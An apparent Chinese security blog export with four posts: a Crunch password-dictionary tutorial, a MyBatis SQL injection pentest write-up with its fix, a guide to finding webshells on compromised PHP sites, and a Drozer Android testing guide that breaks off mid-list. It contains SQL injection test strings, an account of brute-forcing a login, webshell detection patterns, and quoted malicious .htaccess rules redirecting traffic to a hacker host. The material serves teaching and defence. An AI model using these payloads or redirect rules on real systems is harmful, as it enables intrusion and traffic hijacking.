    <url>/2018/05/15/WEB/Linux%E4%B8%8B%E7%9A%84%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Crunch%EF%BC%8C%E5%88%9B%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9E%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<p> ![password.jpg](Linux下的字典生成工具Crunch，创造自己的专属字典/15256173123056.jpg!small<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201201906720.png" style="zoom:50%;"></p>
<p><strong>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。由其在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。</strong></p>
<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address : https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;crunch-wordlist&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>Crunch</strong>为<strong>kali</strong>自带工具之一在kali环境下进行，文中提及的所有命令均可以在kali下直接运行。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201201938900.png" alt="image-20201201201938900" style="zoom:50%;">

<h2 id="0x01-使用语法和参数"><a href="#0x01-使用语法和参数" class="headerlink" title="0x01 使用语法和参数"></a>0x01 使用语法和参数</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch &lt;min&gt; &lt;max&gt; [options]</span><br></pre></td></tr></table></figure>

<p>参数详解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span><br><span class="line">max    设定最大字符串长度（必选）</span><br><span class="line"></span><br><span class="line">oprions</span><br><span class="line">-b     指定文件输出的大小，避免字典文件过大  </span><br><span class="line">-c     指定文件输出的行数，即包含密码的个数</span><br><span class="line">-d     限制相同元素出现的次数</span><br><span class="line">-e     定义停止字符，即到该字符串就停止生成</span><br><span class="line">-f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span><br><span class="line">-i     改变输出格式，即aaa,aab -&gt; aaa,baa</span><br><span class="line">-I     通常与-t联合使用，表明该字符为实义字符</span><br><span class="line">-m     通常与-p搭配</span><br><span class="line">-o     将密码保存到指定文件</span><br><span class="line">-p     指定元素以组合的方式进行</span><br><span class="line">-q     读取密码文件，即读取pass.txt</span><br><span class="line">-r     定义重某一字符串重新开始</span><br><span class="line">-s     指定一个开始的字符，即从自己定义的密码xxxx开始</span><br><span class="line">-t     指定密码输出的格式</span><br><span class="line">-u     禁止打印百分比（必须为最后一个选项）</span><br><span class="line">-z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </span><br></pre></td></tr></table></figure>

<p>特殊字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%      代表数字</span><br><span class="line">^      代表特殊符号</span><br><span class="line">@      代表小写字母</span><br><span class="line">,      代表大写字符   </span><br></pre></td></tr></table></figure>

<h2 id="0x02-实用案例"><a href="#0x02-实用案例" class="headerlink" title="0x02 实用案例"></a>0x02 实用案例</h2><p>（1）生成一个字典文件，用自己指定的字符（默认为26个小写字母为元素的所有组合）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 1 3 123</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202202799.png" alt="image-20201201202202799" style="zoom:50%;">

<p>（2）若字典中需要空格，;等用双引号来表示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 3 3 &quot;ab &quot;</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202253335.png" alt="image-20201201202253335" style="zoom:50%;">

<p>（3）生成几个元素的组合（可以用于社工中收集的信息）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -p zhangsan 2018 0101 ..</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202347907.png" alt="image-20201201202347907" style="zoom:50%;">

<p>（4）生成指定的字符串（比如生成编号，手机号等）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 10 10 -t 201800%%%%</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202447905.png" alt="image-20201201202447905" style="zoom:50%;">

<p>（5）多种组合 生成3个元素的组合，前三位为定义的字符串</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 3 3 -t d@% -p aaa bbb </span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202547817.png" alt="image-20201201202547817" style="zoom:50%;">

<p>（6）通过-l参数来使@,%^等特殊字符输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 7 7 -t p@ss,%^ -l a@aaaaa</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202715831.png" alt="image-20201201202715831" style="zoom:50%;">

<p>（7）-o参数也可使用&gt;&gt;来简化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -d 2@ -t @@@% &gt;&gt; test.txt</span><br></pre></td></tr></table></figure>

<h2 id="0x03-调用密码库"><a href="#0x03-调用密码库" class="headerlink" title="0x03 调用密码库"></a>0x03 调用密码库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202800863.png" alt="image-20201201202800863" style="zoom:50%;">

<p>特殊字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">numeric     表示0123456789</span><br><span class="line">Lalpha      表示26位小写字母</span><br><span class="line">Ualpha      表示26位大写字母</span><br></pre></td></tr></table></figure>

<p>实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +%</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crunch 4 4 -f charset.lst hex-upper -t @@%% -l @xdd</span><br></pre></td></tr></table></figure>

<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>你也可以根据自己需要的字符自己编写密码库文件来完成对特殊字典的编写，来创造自己的专属字典。</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>crunch</tag>
      </tags>
  </entry>
  <entry>
    <title>mybatis框架sql注入针对性渗透测试与修复</title>
    <url>/2020/09/13/WEB/mybatis%E6%A1%86%E6%9E%B6sql%E6%B3%A8%E5%85%A5%E9%92%88%E5%AF%B9%E6%80%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%8E%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<p>mybatis框架sql注入针对性渗透测试与修复</p>
<p>0X00背景</p>
<p>在国内，政府、国企、央企等重点单位的内网应用系统基本都以JAVA为主。由于重点单位对于应用系统的性能、功能、扩展性等各方面及厂商开发快速性要求，SSM框架成为系统架构首选。这种情况下，有必要对梳理SSM框架相关的渗透测试入侵点。本文将针对Mybatis框架易发生注入的点做简单讨论。</p>
<p>0X01 Mybatis概述</p>
<p>Mybatis是支持定制化的SQL、存储过程以及高级映射的优秀的持久层框架。</p>
<p>避免了几乎所有的JDBC代码，手动设置参数以及获取结果集的操作。可以对配置和原生的Map使用简单的XML或注解，将接口和java的POJOs映射成数据库中的记录，极大提高了开发效率。</p>
<p>因为框架避免了用户直接进行SQL语句的拼接，以至于部分开发或安全同学认为只要使用了Mybatis框架，就可以杜绝SQL注入。显然这是不可能的，须知没有免费的午餐，惰性永存，作为安全从业者的我们就是在对抗人性的缺点。</p>
<p>接下来，我们首先了解Mybatis在配置SQL语句时候的两种描述参数的方式</p>
<p>一种为：#{}</p>
<p>一种为：${}</p>
<p>比如</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsBretYk.jpg" alt="img" style="zoom:50%;"> 



<p>这个语句selectPerson,接受一个int(或integer)类型的参数，并返回一个hashmap类型的对象。</p>
<p>注意这里的参数符号是：#{id}</p>
<p>该情况下，Mybatis会创建一个预处理语句参数，通过JDBC，这样的一个参数在SQL中会由一个“？”来标识，并传递到一个新的预处理语句当中，就像这样：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYYuKjL.jpg" alt="img" style="zoom:50%;"> 



<p>那么用$代替#来描述参数会发生什么？</p>
<p>这种情况下，框架会直接把变量拼接到SQL语句当中，不会做其他的处理。就相当于直接字符串拼接SQL语句。</p>
<p>综上：使用#格式的语法，框架会创建预处理语句属性并安全地设置值，这样做安全，迅速，通常也是首选做法。然而有时只是想直接在SQL语句中插入一个不改变的字符串。比如，像ORDER BY,可以这样来使用: ORDER BY S{columnName}。这里MyBatis不会修改或转义字符串。但显然，这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的SQL注入攻击，</p>
<p>0X03 误用场景</p>
<p>通过上部分的讨论，我们知道使用#符号，Mybatis会进行预编译来处理参数，这样可以有效的避免SQL注入。</p>
<p>那么假如所有人都正确使用了#，也就不存在安全问题了。事实却恰恰相反，总有错误的用法，所以咱们才不会失业。</p>
<p>在程序中，如order by字段、表名等，是无法使用预编译语句的，在like参数、in参数、order by这种尝试用拼接逻辑的场景下，开发同学总会给系统留下一点彩蛋。所以在实际测试当中，能聚焦这方面，有针对性的进行漏洞的挖掘，才可以达到事倍功半的效果。</p>
<p>1、 like参数注入</p>
<p>错误写法示例：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsiBde58.jpg" alt="img" style="zoom:50%;"> 

<p>正确写法</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsvyNv3H.jpg" alt="img" style="zoom:50%;"> 

<p>对于Oracle可以通过’%’||’#param#’||’%’避免；</p>
<p>对于MySQL可以通过CONCAT(‘%’,#param#,’%’)避免；</p>
<p>对于MSSQL中通过’%’+#param#+’% 。</p>
<p>2 、in参数的SQL注入</p>
<p>错误写法示例：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsYxgZ05.jpg" alt="img" style="zoom:50%;"> 

<p>正确写法</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpscRshyZ.jpg" alt="img" style="zoom:50%;"> 



<p>3、Order by SQL注入</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsVualOA.jpg" alt="img" style="zoom:50%;"> 

<p>因为预编译机制只能处理查询参数，此处显然不是查询参数，是一种错误的写法，因此order by位置的参数需要开发人员自己处理。所以只能使用$去拼接：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsFLmRAr.jpg" alt="img" style="zoom:50%;"> 







<p>针对这种情况要在代码中做过滤、使用转义等方式处理字符，避免改变SQL逻辑。</p>
<p>其实也可以在xml中处理，用if去判断，这样就显得比较硬编码，sql语句会增加较多，显得臃肿，不便阅读。</p>
<p>通过上面的分析，我们了解到使用了mybatis框架容易误用的地方，可以有针对性的对部分功能展开渗透测试。</p>
<p>0X04 真实案列</p>
<p>某单位系统登陆页面未做验证码验证，进一步验证发现未对失败次数做限制，存在可爆破漏洞。同时是服务单位客户系统，存在弱密码可能极大。对于弱密码是有着永远说不完的话题，正好可以利用一波。</p>
<p>通过前期的信息收集，针对性制作弱密码字典，开始爆破行动。</p>
<p>反复尝试了几次，发现账户、密码正确，成功登陆系统。</p>
<p>接下来针对系统作进一步的渗透测试，因为有mybatis框架，我们只需要针对性测试上文总结的几处场景：</p>
<p>系统存在多处查询功能，查询用户名，会用like方式，猜测此处存在sql注入。</p>
<p>抓包手动测试：</p>
<p>‘ or ‘1’=‘0</p>
<p>‘ and ‘1’=‘1</p>
<p>返回结果明显不同，存在sql注入。</p>
<p>直接测模糊查询功能模块，得到多枚SQL注入。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsIZq2D9.jpg" alt="img"> </p>
<p>Sqlmap结果，Oracle数据库，3个库。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wps7EWkhy.jpg" alt="img" style="zoom:50%;"> 



<p>通过源代码进行修复</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/wpsdraGDp.jpg" alt="img" style="zoom:50%;"> 



<p>我们前面提到like参数场景下的修复方式，如上图在LIKE后面跟 ‘%’||#{字段名}||’%’即可修复。</p>
<p>作为小白一次完整的mybatis框架sql注入针对性渗透测试与修复结束，望大佬们勿喷，请指点。</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
        <tag>Mybatis</tag>
      </tags>
  </entry>
  <entry>
    <title>检测PHP网站是否被攻破的方法</title>
    <url>/2020/09/13/WEB/%E6%A3%80%E6%B5%8BPHP%E7%BD%91%E7%AB%99%E6%98%AF%E5%90%A6%E8%A2%AB%E6%94%BB%E7%A0%B4%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p><strong>0x01 查看访问日志</strong></p>
<p><strong>查看是否有文件上传操作</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:16:48 -0600] &quot;POST&#x2F;uploads&#x2F;monthly_10_2012&#x2F;view.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot; IPREMOVED - - [01&#x2F;Mar&#x2F;2013:06:12:58 -0600] &quot;POST&#x2F;public&#x2F;style_images&#x2F;master&#x2F;profile&#x2F;blog.php HTTP&#x2F;1.1&quot; 200 36 &quot;-&quot; &quot;Mozilla&#x2F;5.0&quot;</span><br></pre></td></tr></table></figure>

<p><strong>nginx默认记录的日志格式为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">access_log logs&#x2F;access.log</span><br></pre></td></tr></table></figure>

<p><strong>或</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">access_log logs&#x2F;access.log combined;</span><br></pre></td></tr></table></figure>

<p><strong>nginx默认记录日志的位置为</strong>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nginx安装目录&#x2F;log&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>iis默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%inetpub%\logs\LogFiles</span><br></pre></td></tr></table></figure>

<p><strong>apache默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%apache%\logs\error.log</span><br></pre></td></tr></table></figure>

<p><strong>weblogic默认记录日志的位置为：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%base_domain%\servers\AdminServer\logs\</span><br></pre></td></tr></table></figure>

<p><strong>0x02 查找还有恶意的php代码文件</strong></p>
<p><strong>2.1查找最近发生变化的php文件</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; -mtime -7</span><br><span class="line"></span><br><span class="line">-type表示搜索一般文件，-mtime -7表示7*24小时内修改的文件</span><br></pre></td></tr></table></figure>



<p>结果可能如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;uploads&#x2F;monthly_04_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_10_2008&#x2F;index.php .&#x2F;uploads&#x2F;monthly_08_2009&#x2F;template.php .&#x2F;uploads&#x2F;monthly_02_2013&#x2F;index.php</span><br></pre></td></tr></table></figure>

<p><strong>2.2 查找文件中是否存在疑似代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(&quot; --color</span><br></pre></td></tr></table></figure>

<p><strong>*( 代表任意个空格</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;base64_decode *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;gzinflate *(&quot; --color find . -type f -name &#39;*.php&#39; | xargs grep -l &quot;eval *(str_rot13 *(base64_decode *(&quot; --color</span><br></pre></td></tr></table></figure>

<p>注解：很多命令不支持管道传递参数，而实际上又需要这样，所以就用了<strong>xargs命令，这个命令可以用来管道传递参数</strong>；<strong>grep -l表示只包含某个字符串的文件名</strong>，如果去掉-l则会显示匹配特定字符串的行内容</p>
<p>几个特殊字符串的意义: </p>
<p><strong>eval()**</strong>把字符串按照php代码来执行，是最常见的php一句话木马**</p>
<p><strong>base64_decode()</strong> <strong>将字符串base64解码，攻击的时候payload是base64编码，则这个函数就有用武之地了</strong></p>
<p><strong>gzinflate()</strong> <strong>将字符串解压缩处理，攻击的时候payload用gzdeflate压缩之后，使用这个函数进行解压缩</strong></p>
<p><strong>str_rot13()</strong> <strong>对字符串进行rot13编码</strong></p>
<p>也可以使用正则表达式来搜索文件，查找可以代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*php&#39; | xargs egrep -i &quot;(mail|fsockopen|pfsockopen|stream\_socket\_client|exec|system|passthru|eval|base64_decode) *(&quot;</span><br></pre></td></tr></table></figure>

<p>下面解释webshell常用的函数：</p>
<p><strong>mail()：**</strong>可用来向网站用户发送垃圾邮件**</p>
<p><strong>fsockopen()**</strong>:打开一个网络连接或者一个unix套接字连接，可用于payload发送远程请求**</p>
<p><strong>pfsockopen()**</strong>:和<strong><strong>fsockopen()</strong></strong>作用类似**</p>
<p><strong>stream_socket_client()**</strong>:建立一个远程连接，**</p>
<p><strong>例子如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php $fp &#x3D; stream_socket_client(&quot;tcp:&#x2F;&#x2F;www.example.com:80&quot;, $errno, $errstr, 30);   if (!$fp) &#123;     echo &quot;$errstr ($errno)&lt;br &#x2F;&gt;\n&quot;;   &#125; else &#123;     fwrite($fp, &quot;GET &#x2F; HTTP&#x2F;1.0\r\nHost: www.example.com\r\nAccept: *&#x2F;*\r\n\r\n&quot;);     while (!feof($fp)) &#123;       echo fgets($fp, 1024);     &#125;     fclose($fp);   &#125;   ?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exec()**</strong>:命令执行函数**</p>
<p><strong>system()**</strong>:同<strong>**exec()</strong></p>
<p><strong>passthru()**</strong>:同<strong>**exec()</strong></p>
<p>preg_replace()正则表达式由修饰符”e”修饰的时候，替换字符串在替换之前需要按照php代码执行，这种情况也需要考虑到，这种情况可采用这种以下扫搜：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;*.php&#39; | xargs egrep -i &quot;preg_replace *\(([&#39;|\&quot;])(.).*\2[a-z]*e[^\1]*\1 *,&quot; --color</span><br></pre></td></tr></table></figure>

<p><strong>0x03 比较代码文件</strong></p>
<p>这种情况需要有一份干净的代码，这份代码和正在使用的代码进行比较。例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff -r wordpress-clean&#x2F; wordpress-compromised&#x2F; -x wp-content</span><br></pre></td></tr></table></figure>

<p>上面的例子是比较wordpress-clean/ 和wordpress-comprised/两个目录，并且目录里面的wp-content/子目录不比较</p>
<p><strong>0x04 搜寻可写的目录</strong></p>
<p>看看这个目录里面是否有可疑的文件，如下脚本查找权限为777的目录是否存在php文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search_dir&#x3D;$(pwd) writable_dirs&#x3D;$(find $search_dir -type d -perm 0777) for dir in $writable_dirs    do        #echo %dir        find $dir -type -f -name &#39;*.php&#39; done        </span><br></pre></td></tr></table></figure>

<p><strong>黑客经常在jpg中插入php代码，因此在查询这些目录的时候也要查询jpg文件：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find wp-content&#x2F;uploads -type f -iname &#39;*.jpg&#39; | xargs grep -i php</span><br></pre></td></tr></table></figure>

<p><strong>注意：-iname 表示文件名不区分大小写 grep -i 也表示不区分大小写</strong></p>
<p><strong>0x05 检测iframe标签</strong></p>
<p>黑客经常做的是嵌入iframe标签，因此可以查看网页的源代码，并且搜索其中是否存在iframe标签，可使用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep -i &#39;&lt;iframe&#39; mywebsite.txt</span><br></pre></td></tr></table></figure>

<p>对于动态生成的页面，可使用firefox的<a href="https://addons.mozilla.org/en-US/firefox/addon/live-http-headers/">Live HTTP Headers</a>插件，下载到源码之后再查找是否存在iframe标签</p>
<p><strong>0x06 查找数据库中是否存在敏感字符串</strong></p>
<p>包括%base64_%、%eval(% 等上面提到的一些关键字</p>
<p><strong>0x07 检查.htacess文件</strong></p>
<p>是否包含了auto_prepend_file和auto_append_file，使用如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_prepend_file find . -type f -name &#39;\.htaccess&#39; | xargs grep -i auto_append_file</span><br></pre></td></tr></table></figure>

<p><strong>注释：.htacess</strong></p>
<p><strong>（</strong>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<strong>）</strong></p>
<p><strong>uto_prepend_file**</strong>的作用是加载当前脚本文件之前，先加载的php脚本 auto_append_file的作用是加载当前脚本文件之后，再加载的php脚本。黑客如果这么修改了.htaccess文件，那么可以在访问.htaccess目录的php脚本时，加载上自己想要加载的恶意脚本 .**</p>
<p>htaccess文件还可以被用来把访问网站的流量劫持到黑客的网站</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_USER_AGENT&#125;^.*Baiduspider.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure>

<p><strong>将baidu爬虫的访问重定向到黑客的网站(包含HTTP_USER_AGENT和http关键字)</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RewriteCond %&#123;HTTP_REFERER&#125; ^.*baidu.com.*$ Rewriterule ^(.*)$ http:&#x2F;&#x2F;www.hacker.com&#x2F;muma.php [R&#x3D;301]</span><br></pre></td></tr></table></figure>

<p><strong>将来自baidu搜索引擎的流量重定向到黑客的网站(包含HTTP_REFERER和http关键字)</strong> </p>
<p>为了查看网站是否被.htaccess修改导致流量劫持，可以在搜索.htaccess文件的时候采用如下命令： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find . -type f -name &#39;\.htaccess&#39; | xargs grep -i http; find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_USER_AGENT;  find . -type f -name &#39;\.htaccess&#39; | xargs grep -i HTTP_REFERER</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>PHP网站</tag>
      </tags>
  </entry>
  <entry>
    <title>Android安全测试框架Drozer(基础篇)</title>
    <url>/2019/06/20/Android/Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6Drozer-%E5%9F%BA%E7%A1%80%E7%AF%87/</url>
    <content><![CDATA[<h2 id="0x00-Drozer-简介"><a href="#0x00-Drozer-简介" class="headerlink" title="0x00 Drozer 简介"></a>0x00 Drozer 简介</h2><p>Drozer是MWR Labs开发的一款Android安全测试框架。是目前最好的Android安全测试工具之一。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”在Web世界已经有了许多安全测试工具了,我们只需要给出一个目标,这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同,Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试,用户在自己的工作站上输入命令,Drozer会将命令发送到Android设备上的代理程序执行。其官方文档说道:“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。</p>
<h2 id="0x01-安装和启动"><a href="#0x01-安装和启动" class="headerlink" title="0x01 安装和启动"></a>0x01 安装和启动</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>第一步：从 <a href="http://mwr.to/drozer">http://mwr.to/drozer</a> 下载Drozer (Windows Installer)</p>
<p>第二步：在 Android 设备中安装 agent.apk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb install agent.apk</span><br></pre></td></tr></table></figure>

<h3 id="2-启动"><a href="#2-启动" class="headerlink" title="2.启动"></a>2.启动</h3><p>第一步：在 PC 上使用 adb 进行端口转发，转发到 Drozer使用的端口 31415</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br></pre></td></tr></table></figure>

<p>第二步：在 Android 设备上开启 Drozer Agent</p>
<p>选择 embedded server-enable</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200913023535118.png" alt="image-20200913023535118"></p>
<p>第三步：在 PC 上开启 Drozer console</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drozer console connect</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/bbbbbb-20200913023554336.jpg" alt="bbbbbb-20200913023554336"></p>
<p>第四步 list命令验证安装（列出所有功能模块）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.activity.info           Gets information about exported activities.         </span><br><span class="line">app.activity.start          Start an Activity                                   </span><br><span class="line">app.broadcast.info          Get information about broadcast receivers           </span><br><span class="line">app.broadcast.send          Send broadcast using an intent                      </span><br><span class="line">app.broadcast.sniff         Register a broadcast receiver that can sniff        </span><br><span class="line">                            particular intents                                  </span><br><span class="line">app.package.attacksurface   Get attack surface of package                       </span><br><span class="line">app.package.backup          Lists packages that use the backup API (returns true</span><br><span class="line">                            on FLAG_ALLOW_BACKUP)                               </span><br><span class="line">app.package.debuggable      Find debuggable packages                            </span><br><span class="line">app.package.info            Get information about installed packages            </span><br><span class="line">app.package.launchintent    Get launch intent of package                        </span><br><span class="line">app.package.list            List Packages                                       </span><br><span class="line">app.package.manifest        Get AndroidManifest.xml of package                  </span><br><span class="line">app.package.native          Find Native libraries embedded in the application.  </span><br><span class="line">app.package.shareduid       Look for packages with shared UIDs                  </span><br><span class="line">app.provider.columns        List columns in content provider                    </span><br><span class="line">app.provider.delete         Delete from a content provider                      </span><br><span class="line">app.provider.download       Download a file from a content provider that        </span><br><span class="line">                            supports files                                      </span><br><span class="line">app.provider.finduri        Find referenced content URIs in a package           </span><br><span class="line">app.provider.info           Get information about exported content providers    </span><br><span class="line">app.provider.insert         Insert into a Content Provider                      </span><br><span class="line">app.provider.query          Query a content provider                            </span><br><span class="line">app.provider.read           Read from a content provider that supports files    </span><br><span class="line">app.provider.update         Update a record in a content provider               </span><br><span class="line">app.service.info            Get information about exported services             </span><br><span class="line">app.service.send            Send a Message to a service, and display the reply  </span><br><span class="line">app.service.start           Start Service                                       </span><br><span class="line">app.service.stop            Stop Service                                        </span><br><span class="line">auxiliary.webcontentresolver</span><br><span class="line">                            Start a web service interface to content providers. </span><br><span class="line">exploit.jdwp.check          Open @jdwp-control and see which apps connect       </span><br><span class="line">exploit.pilfer.general.apnprovider</span><br><span class="line">                            Reads APN content provider                          </span><br><span class="line">exploit.pilfer.general.settingsprovider</span><br><span class="line">                            Reads Settings content provider                     </span><br><span class="line">information.datetime        Print Date&#x2F;Time                                     </span><br><span class="line">information.deviceinfo      Get verbose device information                      </span><br><span class="line">information.permissions     Get a list of all permissions used by packages on   </span><br><span class="line">                            the device                                          </span><br><span class="line">scanner.activity.browsable  Get all BROWSABLE activities that can be invoked    </span><br><span class="line">                            from the web browser                                </span><br><span class="line">scanner.misc.native         Find native components included in packages         </span><br><span class="line">scanner.misc.readablefiles  Find world-readable files in the given folder       </span><br><span class="line">scanner.misc.secretcodes    Search for secret codes that can be used from the   </span><br><span class="line">                            dialer                                              </span><br><span class="line">scanner.misc.sflagbinaries  Find suid&#x2F;sgid binaries in the given folder (default</span><br><span class="line">                            is &#x2F;system).                                        </span><br><span class="line">scanner.misc.writablefiles  Find world-writable files in the given folder       </span><br><span class="line">scanner.provider.finduris   Search for content providers that can be queried    </span><br><span class="line">                            from our context.                                   </span><br><span class="line">scanner.provider.injection  Test content providers for SQL injection            </span><br><span class="line">                            vulnerabilities.                                    </span><br><span class="line">scanner.provider.sqltables  Find tables accessible through SQL injection        </span><br><span class="line">                            vulnerabilities.                                    </span><br><span class="line">scanner.provider.traversal  Test content providers for basic directory traversal</span><br><span class="line">                            vulnerabilities.                                    </span><br><span class="line">shell.exec                  Execute a single Linux command.                     </span><br><span class="line">shell.send                  Send an ASH shell to a remote listener.             </span><br><span class="line">shell.start                 Enter into an interactive Linux shell.              </span><br><span class="line">tools.file.download         Download a File                                     </span><br><span class="line">tools.file.md5sum           Get md5 Checksum of file                            </span><br><span class="line">tools.file.size             Get size of file                                    </span><br><span class="line">tools.file.upload           Upload a File                                       </span><br><span class="line">tools.setup.busybox         Install Busybox.                                    </span><br><span class="line">tools.setup.minimalsu       Prepare 